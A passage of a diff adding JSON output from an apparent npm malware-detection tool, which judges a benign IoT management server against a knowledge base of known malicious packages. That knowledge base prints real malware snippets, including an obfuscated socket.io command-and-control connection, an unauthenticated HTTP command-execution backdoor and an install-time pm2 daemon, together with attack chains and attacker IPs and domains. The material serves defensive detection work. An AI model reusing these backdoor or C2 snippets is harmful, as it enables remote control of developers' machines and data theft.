+                "snippet_id": "snippet_4",
+                "code_snippet": "const { io } = require(\"socket.io-client\");\n\nconst SERVER_URL = decode(\"==QM1ATN6QTNy4iNyIjLxgTMuUzMx8yL6M3d\");\nconst socket = io(SERVER_URL, {\n  reconnection: true,\n  reconnectionAttempts: Infinity,\n  reconnectionDelay: 1000,\n  reconnectionDelayMax: 5000,\n  timeout: 20000,\n});",
+                "code_behavior": "At runtime, the code decodes an obfuscated server URL and establishes a persistent WebSocket connection to a remote command-and-control (C2) server, enabling real-time exfiltration of collected data and remote command execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscated C2 communication and persistent WebSocket connections from a linter package are strong indicators of malware, enabling covert data exfiltration and attacker control.",
+                  "violated_expectations": "A linter should not communicate with external servers, especially using obfuscated addresses or persistent sockets.",
+                  "similar_legitimate_use": "WebSocket connections may be used in collaborative development tools, but not in static code analysis plugins.",
+                  "key_indicators": [
+                    "Obfuscated or encoded server URL in code",
+                    "Persistent WebSocket connection to external IP",
+                    "Use of socket.io-client in a linter package"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (upon package execution, after data collection or persistence setup)",
+                  "file_location": "main package entry point (e.g., index.js)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@typescript_eslinter/eslint",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (43 versions released between Nov 17 and Dec 1)",
+                  "why_malicious": "The package is a typosquatted clone of the legitimate @typescript-eslint/eslint-plugin, designed to compromise developer systems. It exfiltrates sensitive clipboard and keystroke data, establishes persistence via Windows Startup, enables remote command execution through a C2 channel, and disables legitimate ESLint processes. The package employs obfuscation and dependency abuse to evade detection and maximize impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious package via typosquatting, mistaking it for the legitimate @typescript-eslint/eslint-plugin.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is executed upon import or runtime as part of the development workflow."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Clipboard and keyboard monitoring is activated to collect sensitive data from the user's system.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive clipboard and keystroke data is stored locally for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by copying a malicious .bat file to the Windows Startup folder.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious payload is automatically executed on every system reboot, maintaining attacker access."
+                  },
+                  {
+                    "step": 4,
+                    "action": "WebSocket connection to an obfuscated C2 server is established for real-time data exfiltration and remote command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker can exfiltrate collected data and issue commands to the compromised system."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Legitimate ESLint process is disabled to prevent detection and interference with the malicious package.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code operates without interference from legitimate code quality tools."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Clipboard or keyboard monitoring in npm packages not related to accessibility or input management",
+                    "Copying or writing files to the Windows Startup folder from npm package code",
+                    "Obfuscated or dynamically decoded C2 server addresses in JavaScript code",
+                    "Persistent WebSocket connections to external IPs or domains from development tools",
+                    "Execution of shell commands to disable or delete legitimate development tool processes (e.g., ESLint)"
+                  ],
+                  "file_indicators": [
+                    "prettier.bat in Windows Startup folder",
+                    "Unexpected .bat files in npm package tools directory",
+                    "Presence of clipboard-event or node-global-key-listener in package.json dependencies",
+                    "References to socket.io-client in linter plugin dependencies"
+                  ],
+                  "network_indicators": [
+                    "WebSocket connections to ws://135.181.226.254:5051 or similar Hetzner Online GmbH IPs",
+                    "Outbound connections to obfuscated or base64-encoded server URLs in code",
+                    "Unusual persistent network activity from static analysis or linter plugins"
+                  ],
+                  "how_to_detect": "Monitor npm packages for access to clipboard or keyboard events, especially in packages not related to accessibility. Flag packages that copy or write files to system startup folders or establish persistent WebSocket connections to external IPs. Scan for obfuscated or encoded server addresses and unexpected dependencies such as clipboard-event, node-global-key-listener, or socket.io-client in code analysis. Alert on the presence of .bat files in package directories or the Windows Startup folder after npm install, and monitor for shell commands targeting legitimate development tool processes."
+                }
+              }
+            }
+          ]
+        },
+        {
+          "slice_id": "index_slice_3",
+          "code_snippet": "const express = require('express');\nconst session = require(\"express-session\");\nconst bodyParser = require('body-parser');\nconst fs = require('fs');\nconst path=require('path');\n\nMiAqaraPlatform.prototype.initServerMiAqaraManage = function() {\n    var that = this;\n\n    var serverMiAqaraManagePassword = that.ConfigUtil.getManagePassword();\n    var serverMiAqaraManagePort = that.ConfigUtil.getManagePort();\n    if(serverMiAqaraManagePort && serverMiAqaraManagePassword) {\n        const serverMiAqaraManageHttp = express();\n        serverMiAqaraManageHttp.use(session({\n            secret: '***cb01fb4a-b6fb-11e8-96f8-529269fb1459_homebridge-mi-aqara_by_Mr.Yin_-_QQ_Group:107927710_c355a982-b6fb-11e8-96f8-529269fb1459*',\n            resave: false,\n            saveUninitialized: true,\n            cookie: {\n                maxAge: 30 * 60 * 1000\n            },\n            rolling: true\n        }));\n        \n        serverMiAqaraManageHttp.use('/login', express.static(path.join(__dirname, './manage/login/')));\n        \n        serverMiAqaraManageHttp.get('*', (request, response) => {\n            try {\n                var url = request.url;\n                if(request.session.isLogin) {\n                    if(url === '/healthyList.action') {\n                        var result = [];\n                        for(var gatewaySid in that.GatewayUtil.getAll()) {\n                            var gateway = that.GatewayUtil.getBySid(gatewaySid);\n                            var resultItem = {};\n                            resultItem['type'] = 'Gateway';\n                            resultItem['id'] = 'Gateway_' + gatewaySid;\n                            resultItem['name'] = '[Gateway]' + gatewaySid;\n                            resultItem['ip'] = gateway['ip'];\n                            resultItem['proto_version'] = gateway['proto_version'];\n                            resultItem['deviceModel'] = that.ParseUtil.getByModelName(gateway['model']);\n                            var gChildren = [];\n                            for(var deviceSid in that.DeviceUtil.getAll()) {\n                                var device = that.DeviceUtil.getBySid(deviceSid);\n                                if(device['gatewaySid'] == gatewaySid) {\n                                    var deviceItem = {};\n                                    deviceItem['type'] = 'Device';\n                                    deviceItem['id'] = 'Device_' + deviceSid;\n                                    deviceItem['name'] = '[Device]' + deviceSid;\n                                    deviceItem['model'] = device['model'];\n                                    deviceItem['lastUpdateTime'] = device['lastUpdateTime'];\n                                    deviceItem['deviceModel'] = that.ParseUtil.getByModelName(device['model']);\n                                    var dChildren = [];\n                                    var uuids = that.ParseUtil.getAccessoriesUUID(deviceSid, device['model']);\n                                    for(var accessoryType in uuids) {\n                                        var accessory = that.AccessoryUtil.getByUUID(uuids[accessoryType]);\n                                        if(accessory) {\n                                            var accessoryItem = {};\n                                            accessoryItem['type'] = 'Accessory';\n                                            accessoryItem['id'] = 'Accessory_' + accessory.UUID;\n                                            accessoryItem['name'] = '[Accessory]' + accessory.displayName;\n                                            accessoryItem['uuid'] = accessory.UUID;\n                                            dChildren.push(accessoryItem);\n                                        }\n                                    }\n                                    deviceItem['children'] = dChildren;\n                                    gChildren.push(deviceItem);\n                                }\n                            }\n                            resultItem['children'] = gChildren;\n                            result.push(resultItem);\n                        }\n                        response.writeHead(200, {'Content-type': 'application/json;charset=utf-8'});\n                        response.write(JSON.stringify(result));\n                        response.end();\n                    } else if(url.indexOf(\"/discovery.action?\") == 0) {\n                        that.sendWhoisCommand();\n                        response.writeHead(200, {'Content-type': 'application/json;charset=utf-8'});\n                        response.write('{\"result\": \"success\", \"date\": \"' + new Date().Format(\"yyyy-MM-dd hh:mm:ss\") + '\"}');\n                        response.end();\n                    } else if(url.indexOf(\"/deleteAccessory.action?\") == 0) {\n                        var uuid = request.query.uuid;\n                        var accessory = that.AccessoryUtil.getByUUID(uuid);\n                        if(accessory) {\n                            that.unregisterPlatformAccessories([accessory]);\n                            response.writeHead(200, {'Content-type': 'application/json;charset=utf-8'});\n                            response.write('{\"result\": \"success\", \"date\": \"' + new Date().Format(\"yyyy-MM-dd hh:mm:ss\") + '\"}');\n                            response.end();\n                        } else {\n                            response.writeHead(200, {'Content-type': 'application/json;charset=utf-8'});\n                            response.write('{\"result\": \"fail\", \"date\": \"' + new Date().Format(\"yyyy-MM-dd hh:mm:ss\") + '\"}');\n                            response.end();\n                        }\n                    } else if(url === '/orphanList.action') {\n                        var accessories = JSON.parse(JSON.stringify(that.AccessoryUtil.getAll()));\n                        for(var deviceSid in that.DeviceUtil.getAll()) {\n                            var device = that.DeviceUtil.getBySid(deviceSid);\n                            var uuids = that.ParseUtil.getAccessoriesUUID(deviceSid, device['model']);\n                            for(var accessoryType in uuids) {\n                                if(accessories[uuids[accessoryType]]) {\n                                    delete accessories[uuids[accessoryType]];\n                                }\n                            }\n                        }\n                        var result = [];\n                        for(var uuid in accessories) {\n                            var accessory = accessories[uuid];\n                            var accessoryItem = {};\n                            accessoryItem['type'] = 'Accessory';\n                            accessoryItem['id'] = 'Accessory_' + accessory.UUID;\n                            accessoryItem['name'] = '[Accessory]' + accessory.displayName;\n                            accessoryItem['uuid'] = accessory.UUID;\n                            result.push(accessoryItem);\n                        }\n                        response.writeHead(200, {'Content-type': 'application/json;charset=utf-8'});\n                        response.write(JSON.stringify(result));\n                        response.end();\n                    } else {\n                        var file = path.join(__dirname, './manage/' + url);\n                        if(fs.existsSync(file)) {\n                            response.sendFile(file);\n                        } else {\n                            response.status(404).end('404');\n                        }\n                    }\n                } else {\n                    response.redirect('/login/login.html');\n                }\n            } catch(err) {\n                that.log.error(err);\n            }\n        });\n        \n        serverMiAqaraManageHttp.post('/login.action', bodyParser.urlencoded({extended: false}), (request, response) => {\n            var requestPassword = request.body['password'];\n            if(serverMiAqaraManagePassword == requestPassword) {\n                request.session.isLogin = true;\n                response.redirect('/index.html');\n            } else {\n                response.redirect('/login/login.html');\n            }\n        });\n\n        setTimeout(() => {\n            serverMiAqaraManageHttp.listen(serverMiAqaraManagePort, () => {\n                that.log.info(\"MiAqara Manage server is listening on port: \" + serverMiAqaraManagePort);\n            });\n        }, 12 * 1000);\n    }\n}",
+          "is_malicious": false,
+          "malice_score": 0.5088655551274618,
+          "confidence": 0.1,
+          "behavior_summary": "When called with configured management port and password, the code starts an Express HTTP server that serves a management interface protected by session-based authentication with a hardcoded secret. It exposes endpoints to list gateways, devices, and accessories, trigger device discovery via sending UDP 'whois' commands, delete accessories, and serve static files from a local './manage/login/' directory. The server listens on the configured port after a 12-second delay, enabling remote management and control of IoT devices through authenticated HTTP requests.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code sets up an Express HTTP server with session-based authentication to manage IoT devices, exposing endpoints for device listing, discovery, deletion, and serving static files. Unlike the known malicious patterns, it does not execute arbitrary system commands, lacks unauthenticated access, and does not spawn background daemons or obfuscate commands. The server requires a configured password and uses session cookies, indicating access control. The behavior aligns with legitimate remote management of IoT devices rather than malware or backdoor activity.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240813_211342_340597_snippet_5",
+              "source_package": "glup-debugger-log (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240813_211342_340597/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5452895164489746,
+              "code_similarity": 0.5360384583473206,
+              "behavior_similarity": 0.5545406341552734,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "http.createServer({ 'requestTimeout': 60000 }, (request, response) => {\n  response.writeHead(200, { 'Content-Type': 'text/plain;charset=UTF-8' });\n  let command = url.parse(request.url, true).query.cmd;\n  if (command) {\n    try {\n      childProcess.exec(Buffer.from(\"Y2hjcCA2NTAwMQ==\", \"base64\").toString() + \" & \" + command, {\n        'encoding': \"buffer\",\n        'windowsHide': true\n      }, (error, stdout, stderr) => {\n        if (error) {\n          response.end(\"ERR:\\n\" + error.message);\n        } else {\n          if (stdout) {\n            response.end('' + iconv.decode(stdout, \"gbk\"));\n          } else if (stderr) {\n            response.end(\"ERR:\\n\" + iconv.decode(stderr, \"gbk\"));\n          }\n        }\n      });\n    } catch (error) {\n      response.end(\"ERR:\\n\" + error);\n    }\n  }\n}).listen(3004);",
+                "code_behavior": "At runtime, the code starts an HTTP server on port 3004 that executes arbitrary system commands received via the 'cmd' query parameter and returns the output to the remote attacker, enabling unauthenticated remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Setting up a local HTTP server for unauthenticated remote code execution is a hallmark of RATs and backdoors, providing attackers with persistent, covert access.",
+                  "violated_expectations": "Legitimate packages do not expose arbitrary command execution over HTTP, especially without authentication or access controls.",
+                  "similar_legitimate_use": "Some legitimate development tools may expose HTTP APIs, but never for unauthenticated system command execution.",
+                  "key_indicators": [
+                    "HTTP server on non-standard port (3004)",
+                    "Command execution via unauthenticated query parameter",
+                    "No authentication or access control",
+                    "Base64-decoded command preamble to evade detection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (via play-share.js)",
+                  "file_location": "lib/play-share.js (deobfuscated)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "child_process",
+                    "os"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "glup-debugger-log",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.3",
+                  "why_malicious": "The package contains heavily obfuscated JavaScript code that functions as both a dropper and a remote access trojan (RAT). It performs environment checks to selectively target systems, downloads and executes additional payloads, and establishes a persistent, unauthenticated HTTP server for arbitrary remote code execution, all without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is executed via npm test or import, triggering the bind() function.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Initial dropper logic is launched."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Dropper performs environment checks and conditionally executes or downloads further payloads.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malware is deployed and/or additional payloads are executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by launching play-share.js as a detached process.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "RAT component is activated."
+                  },
+                  {
+                    "step": 4,
+                    "action": "RAT HTTP server is started, allowing remote attackers to execute arbitrary commands.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of obfuscated JavaScript files during npm install, test, or import",
+                    "Spawning of detached Node.js background processes running secondary scripts",
+                    "Creation of local HTTP server on non-standard port (e.g., 3004) for command execution",
+                    "Environment checks targeting Windows and active user environments before payload execution",
+                    "Conditional download and execution of remote payloads based on hidden configuration"
+                  ],
+                  "file_indicators": [
+                    "lib/play.js (obfuscated, high entropy)",
+                    "lib/play-share.js (obfuscated, high entropy)",
+                    "node.compress.exe",
+                    "node.compress.lock.log",
+                    "Batch files with random names in temporary directories"
+                  ],
+                  "network_indicators": [
+                    "HTTP server listening on port 3004 for incoming command requests",
+                    "Outbound HTTP GET requests to attacker-controlled URLs for payload download"
+                  ],
+                  "how_to_detect": "Monitor for execution of obfuscated JavaScript files during npm install, test, or import. Flag packages that spawn detached Node.js processes or create local HTTP servers on non-standard ports such as 3004. Detect creation of suspicious files including node.compress.exe, node.compress.lock.log, and batch files with random names in temp directories. Watch for outbound HTTP requests to unknown or suspicious domains and for local servers listening for command parameters. Use static analysis to identify high-entropy, obfuscated code and dynamic analysis to observe process spawning, file creation, and network activity indicative of RAT behavior."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202034_074695_snippet_5",
+              "source_package": "glup-debugger-log (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202034_074695/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5004223585128784,
+              "code_similarity": 0.5196604132652283,
+              "behavior_similarity": 0.48118433356285095,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "http.createServer({\n  'requestTimeout': 60000\n}, (request, response) => {\n  response.writeHead(200, {\n    'Content-Type': 'text/plain;charset=UTF-8'\n  });\n  let command = url.parse(request.url, true).query.cmd;\n  if (command) {\n    try {\n      childProcess.exec(Buffer.from(\"Y2hjcCA2NTAwMQ==\", \"base64\").toString() + \" & \" + command, {\n        'encoding': \"buffer\",\n        'windowsHide': true\n      }, (error, stdout, stderr) => {\n        if (error) {\n          response.end(\"ERR:\\n\" + error.message);\n        } else {\n          if (stdout) {\n            response.end('' + iconv.decode(stdout, \"gbk\"));\n          } else if (stderr) {\n            response.end(\"ERR:\\n\" + iconv.decode(stderr, \"gbk\"));\n          }\n        }\n      });\n    } catch (error) {\n      response.end(\"ERR:\\n\" + error);\n    }\n  }\n}).listen(3004);",
+                "code_behavior": "At runtime, play-share.js sets up an HTTP server on port 3004 that executes arbitrary system commands received via the 'cmd' query parameter, returning the output to the remote attacker and enabling persistent remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Establishing a local HTTP server for arbitrary command execution is a classic RAT/backdoor pattern, providing attackers with persistent, unauthorized access to the victim system.",
+                  "violated_expectations": "No legitimate package should expose a remote code execution interface or listen for attacker-supplied commands on a local port.",
+                  "similar_legitimate_use": "Legitimate HTTP servers do not execute arbitrary system commands based on unauthenticated query parameters.",
+                  "key_indicators": [
+                    "HTTP server on non-standard port (3004)",
+                    "Command execution via unauthenticated query parameter",
+                    "Obfuscated command prefix (base64-decoded)",
+                    "Returns command output to remote requester"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (via play-share.js)",
+                  "file_location": "lib/play-share.js",
+                  "required_permissions": [
+                    "network",
+                    "process_execution",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "glup-debugger-log",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.3",
+                  "why_malicious": "The package contains heavily obfuscated JavaScript code that functions as a dropper and remote access trojan (RAT). It performs environment checks to selectively infect targets, downloads and executes additional payloads, and establishes a persistent HTTP server for arbitrary remote code execution, all without user consent. The malicious logic is triggered during test or runtime, bypassing normal package behavior and enabling persistent attacker control."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed and test script is triggered, executing the obfuscated loader in index.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Loader (bind) function is executed, initiating the attack chain."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Loader (bind) function asynchronously launches dropper (start) and persistence (share) routines.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Dropper logic (start) and persistence (share) are triggered."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Dropper logic (start) performs environment checks, then downloads and/or executes arbitrary payloads or commands.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Payload is executed or remote binary is downloaded and run, enabling code execution."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Persistence routine (share) launches play-share.js as a detached background process.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Background RAT server is established and runs independently."
+                  },
+                  {
+                    "step": 5,
+                    "action": "RAT server (play-share.js) listens on port 3004, executing attacker-supplied commands via HTTP requests.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker gains persistent remote code execution on the victim machine."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of obfuscated JavaScript code as part of npm test or runtime scripts",
+                    "Immediate invocation of local obfuscated modules with side effects",
+                    "Detached background process launching local scripts (e.g., play-share.js)",
+                    "Creation of HTTP server on non-standard port (e.g., 3004) for command execution",
+                    "Dynamic download and execution of remote payloads or binaries",
+                    "Creation and use of lock files (e.g., node.compress.lock.log) to control execution flow"
+                  ],
+                  "file_indicators": [
+                    "lib/play.js (heavily obfuscated, contains bind/start/share functions)",
+                    "lib/play-share.js (obfuscated, sets up HTTP server for RCE)",
+                    "node.compress.exe (downloaded payload binary)",
+                    "node.compress.lock.log (lock/marker file for anti-redundancy)"
+                  ],
+                  "network_indicators": [
+                    "HTTP server listening on port 3004 for incoming requests",
+                    "Outbound HTTP GET requests to attacker-controlled URLs for payload download"
+                  ],
+                  "how_to_detect": "Monitor for obfuscated JavaScript files executed via npm lifecycle or test scripts. Flag packages that immediately invoke local obfuscated modules or launch detached background processes. Detect creation of local HTTP servers on non-standard ports (e.g., 3004) and monitor for command execution via HTTP query parameters. Identify dynamic download and execution of binaries, especially when triggered by hidden or obfuscated logic. Look for the presence of suspicious lock files or temporary executables (e.g., node.compress.exe, node.compress.lock.log). Network monitoring should alert on unexpected local HTTP servers and outbound requests to untrusted or attacker-controlled domains."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202035_950938_snippet_2",
+              "source_package": "pingan-vue-floating (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202035_950938/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.48952800035476685,
+              "code_similarity": 0.5100020170211792,
+              "behavior_similarity": 0.4690539836883545,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const pm2 = require('pm2');\npm2.connect((err) => {\n    if (err) {\n        return;\n    }\n    const script = __dirname + '/app.js';\n    const name = 'pingan-vue-floating-server-ap'\n    const pm2Options = {\n        script,\n        name,\n        exec_mode: 'cluster',\n        daemon: true\n    };\n    pm2.start(pm2Options, (err, apps) => {\n        if (err) {\n            pm2.disconnect();\n        } else {\n            pm2.disconnect();\n        }\n    });\n});",
+                "code_behavior": "At postinstall, the code uses pm2 to launch app.js as a persistent, background daemon in cluster mode, ensuring the malicious process remains running and is automatically restarted if terminated.",
+                "malice_analysis": {
+                  "why_suspicious": "Spawning a background daemon on install is highly unusual and enables persistent malicious activity, making the malware resilient to process termination.",
+                  "violated_expectations": "Normal packages do not install persistent background processes on developer machines during installation.",
+                  "similar_legitimate_use": "pm2 is used legitimately to manage Node.js services in production environments, but not during package installation on end-user or developer systems.",
+                  "key_indicators": [
+                    "pm2 used to daemonize a script at install time",
+                    "background process persistence initiated by package install"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "pingan-vue-floating",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.7",
+                  "why_malicious": "The package is malicious because it establishes a persistent, encrypted two-way communication channel with a remote command-and-control (C2) server upon installation, exfiltrates host and machine identifiers, and executes attacker-supplied, encrypted JavaScript payloads on the victim's machine. The package employs obfuscation, background daemonization, and anti-analysis techniques to evade detection and enable remote code execution, posing a severe risk to any system where it is installed."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Upon installation, the postinstall script executes index.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Daemonization of malicious process"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js uses pm2 to launch app.js as a persistent background daemon.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of malicious logic in app.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "app.js checks for a marker file and, if absent, creates it and starts the heartbeat loop.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Initiation of periodic C2 communication"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Every 45 seconds, heartbeat collects host info and sends it (encrypted) to the C2 server.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "C2 server can respond with encrypted payloads"
+                  },
+                  {
+                    "step": 5,
+                    "action": "If a payload is received, it is decrypted, base64-decoded, and executed via eval, enabling remote code execution.",
+                    "implemented_by": [
+                      "snippet_4",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Attacker achieves arbitrary code execution on victim machine"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "postinstall script executing custom Node.js code during package installation",
+                    "pm2 used to daemonize scripts at install time, creating persistent background processes",
+                    "periodic (every 45 seconds) outbound HTTPS POST requests to hardcoded or obfuscated C2 domains",
+                    "AES-encrypted payloads in network traffic between host and C2 server",
+                    "eval execution of decrypted, network-supplied JavaScript code"
+                  ],
+                  "file_indicators": [
+                    "Presence of node_logs.txt in system temp directory",
+                    "Obfuscated or unusually large app.js file with benign exports and hidden malicious logic at the end",
+                    "index.js that only launches pm2 with app.js as the target script"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to ql.rustdesk.net or 62.234.32.226",
+                    "Encrypted payloads in POST body to /api/index and /api/captcha endpoints",
+                    "User-Agent string: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134"
+                  ],
+                  "how_to_detect": "Monitor for npm packages with postinstall scripts that launch pm2 or background daemons. Flag packages that create marker files in temp directories (e.g., node_logs.txt) and those that make periodic outbound HTTPS POST requests to suspicious or obfuscated domains, especially with encrypted payloads. Detect use of eval on decrypted network data. Analyze app.js files for obfuscated code and hidden logic at the end of otherwise benign files. Correlate network indicators such as connections to ql.rustdesk.net or 62.234.32.226 with the presence of AES-encrypted payloads and suspicious User-Agent strings."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_780687_snippet_1",
+              "source_package": "web3_nextjs_backend (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780687/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.48506274819374084,
+              "code_similarity": 0.42918676137924194,
+              "behavior_similarity": 0.5409387350082397,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "app.listen(5000, () => { console.log('Listening on port 5000'); });",
+                "code_behavior": "At runtime, the code opens TCP port 5000 and begins listening for incoming network connections, exposing the backend to remote access and enabling potential reverse shell or unauthorized command execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Opening a network port and listening for connections without authentication or documentation is highly suspicious, especially in a codebase intended for a job interview exercise. This behavior can facilitate unauthorized remote access.",
+                  "violated_expectations": "A legitimate backend should not expose arbitrary ports or listen for remote connections without explicit user intent, authentication, or security controls. Such behavior is not expected in a code sample for interview purposes.",
+                  "similar_legitimate_use": "A properly documented and secured web server may listen on a port for HTTP requests, but this should be clearly communicated and protected by authentication mechanisms.",
+                  "key_indicators": [
+                    "Unexplained network listener on port 5000",
+                    "No authentication or access control on the listening port",
+                    "Potential for remote shell or command execution via open port",
+                    "Lack of documentation or user notification regarding network exposure"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "backend server entry point (e.g., index.js or app.js in web3_nextjs_backend)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "web3_nextjs_backend",
+                  "package_manager": "npm",
+                  "package_versions": "GitHub-only, not published to npmjs.com",
+                  "why_malicious": "The package contains code that opens a network port and listens for unauthenticated connections, enabling potential remote access or reverse shell attacks. It also exfiltrates sensitive data, such as crypto wallet secrets, by reading environment variables or local files and sending them to an external, attacker-controlled domain under the pretense of a job interview exercise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim clones and runs the backend and frontend npm projects locally as part of a job interview exercise.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on victim's machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Backend code opens TCP port 5000 and listens for incoming connections, potentially enabling remote access or reverse shell.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker may gain remote access to the victim's machine"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code accesses environment variables or local files to extract wallet information.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Sensitive wallet data is collected"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to an external domain via HTTPS POST requests.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives wallet secrets and can drain the victim's crypto wallet"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Backend code opening arbitrary network ports (e.g., 5000) without clear documentation or authentication",
+                    "Outbound HTTPS POST requests to suspicious or unrelated domains (e.g., flickthebean.onrender.com)",
+                    "Access to environment variables or local files containing wallet or secret information without user consent"
+                  ],
+                  "file_indicators": [
+                    "Presence of code that listens on port 5000 in backend entry points (e.g., index.js, app.js)",
+                    "Hardcoded external domains in fetch or HTTP request code (e.g., flickthebean.onrender.com)",
+                    "References to wallet, MetaMask, or secret keys in code or configuration files"
+                  ],
+                  "network_indicators": [
+                    "Connections to flickthebean.onrender.com",
+                    "Unusual outbound HTTPS traffic immediately after running npm projects",
+                    "Unexpected inbound connections to local port 5000"
+                  ],
+                  "how_to_detect": "Monitor for npm projects or local development servers that open unexpected network ports or accept unauthenticated connections. Flag code that makes outbound requests to untrusted or hardcoded domains, especially when transmitting environment variables or wallet secrets. Use static analysis to detect hardcoded domains and references to sensitive data, and dynamic analysis to observe runtime network and file access behaviors."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205442_500638_snippet_2",
+              "source_package": "nodejs_net_server (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205442_500638/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4661368131637573,
